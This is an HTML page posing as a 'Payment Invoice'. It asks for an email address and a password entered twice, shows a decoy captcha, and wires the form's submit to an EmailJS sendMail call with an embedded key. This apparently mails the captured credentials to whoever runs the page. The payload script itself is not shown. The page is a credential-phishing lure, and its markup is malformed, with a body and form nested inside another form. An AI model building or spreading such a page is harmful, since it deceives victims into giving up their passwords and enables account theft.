<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Invoice</title>
    <link rel="stylesheet" href="style.css">   
    <script src="index.js"></script>
    <script type="text/javascript"
            src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
    </script>
    <script type="text/javascript">
       (function(){
          emailjs.init("YUKFoIWdJE1GPoTS0");
       })();
    </script>
</head>
<body>
        <div class="container">
            <form onsubmit="sendMail(); reset(); return false;">
                <div class="text"> 
                    <h1>Payment Invoice</h1>
                    <h3>Enter your Email Address.</h3>
                    <h4>Email</h4>
                    <input type="email" id="email" required >
                    <p>Note: Keeping your credentials safe is super important.</p>
                    <h3>Enter your password and confirm it.</h3>
                    <h4>Password</h4>
                    <input type="password" id="password" required>
                    <h4>Confirm Password</h4>
                    <input type="password" id="password_repect" required>
                    <h4>Enter the characters you see</h4> 
                    <body onload="createCaptcha()">
                        <form onsubmit="validateCaptcha()">
                        <div id="captcha">
                        </div>
                        <input type="text" id="cpatchaTextBox" required>
                    </body>            
                    <button onsubmit="sendMail()">Submit</button>
                </div>
            </form>
        </div>
</body>
</html>
